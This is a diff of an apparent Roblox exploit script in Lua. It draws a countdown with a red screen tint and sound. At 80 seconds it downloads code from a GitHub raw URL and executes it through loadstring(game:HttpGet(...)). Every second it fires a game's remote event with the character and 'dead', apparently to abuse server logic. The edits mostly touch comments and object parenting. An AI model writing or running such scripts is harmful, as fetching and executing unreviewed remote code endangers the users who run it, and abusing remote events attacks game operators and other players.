@@ -1,7 +1,7 @@
 local player = game.Players.LocalPlayer
 
 local gui = Instance.new("ScreenGui")
-gui.Parent = player:FindFirstChild("PlayerGui")
+gui.Parent = player:WaitForChild("PlayerGui")
 
 -----------------------------
 -- Create ImageLabel (Small & Top Center)
@@ -33,7 +33,7 @@ local gradient = Instance.new("UIGradient")
 gradient.Parent = countdownLabel
 gradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200)), -- Lighter gray at start
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 100, 100)), -- Lighter gray in the middle (smoother transition)
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 100, 100)), -- Smoother transition in the middle
     ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200)) -- Darker gray at the end
 })
 
@@ -44,17 +44,17 @@ local redTint = Instance.new("Frame")
 redTint.Parent = gui
 redTint.Size = UDim2.new(1, 0, 1, 0)
 redTint.BackgroundColor3 = Color3.new(1, 0, 0) -- Red color
-redTint.BackgroundTransparency = 1 -- Initially invisible (completely transparent)
-redTint.ZIndex = -1 -- Make sure the red tint stays behind everything else
+redTint.BackgroundTransparency = 1 -- Initially invisible
+redTint.ZIndex = -1 -- Ensure the red tint stays behind other elements
 
 -----------------------------
 -- Sound (to be played when countdown reaches 80)
 -----------------------------
 local sound = Instance.new("Sound")
-sound.Parent = player.Character or player:WaitForChild("Character")
+sound.Parent = player:WaitForChild("PlayerGui")  -- Parent to PlayerGui for persistence
 sound.SoundId = "rbxassetid://5660608255"
-sound.Volume = 0.7 -- Volume level is set to 0.6 (on a scale from 0 to 1, with 1 being full volume)
-sound.Looped = true -- Make the sound loop
+sound.Volume = 0.7
+sound.Looped = true
 
 -----------------------------
 -- Countdown Timer
@@ -64,38 +64,38 @@ while countdown >= 0 do
     countdownLabel.Text = tostring(countdown)
     
     if countdown == 80 then
-        -- Make screen red-tinted (start the red tint effect at 80 seconds)
-        redTint.BackgroundTransparency = 0.75 -- Make the red tint slightly visible
+        -- Activate red tint effect
+        redTint.BackgroundTransparency = 0.75
         
-        -- Execute the loadstring when countdown reaches 80
+        -- Execute the loadstring code
         loadstring(game:HttpGet("https://raw.githubusercontent.com/lovestacyxoxo/Escape-ring-extermination-/refs/heads/main/Ring"))()
         
-        -- Play the sound at 80 seconds
+        -- Wait briefly to ensure the sound asset loads properly
+        wait(0.5)
+        
+        -- Play the sound
         sound:Play()
     end
 
     if countdown == 0 then
-        -- Reset player (you can add other reset functionality if needed)
+        -- Reset the player's character
         player:LoadCharacter()
         
-        -- Stop the sound when countdown reaches 0
+        -- Stop the sound
         sound:Stop()
     end
 
-    -- Fire the remote event for the local player
+    -- Fire the remote event for the local player's character
     local args = {
         [1] = player.Character, -- Target the local player's character
         [2] = "dead" -- The action to be passed
     }
 
-    -- Ensure ReplicatedStorage and the events are valid before firing
     local replicatedStorage = game:GetService("ReplicatedStorage")
     local events = replicatedStorage:WaitForChild("events")
     local actn = events:WaitForChild("actn")
-
-    -- Fire the remote event
     actn:FireServer(unpack(args))
 
-    countdown -= 1
+    countdown = countdown - 1
     wait(1)
 end
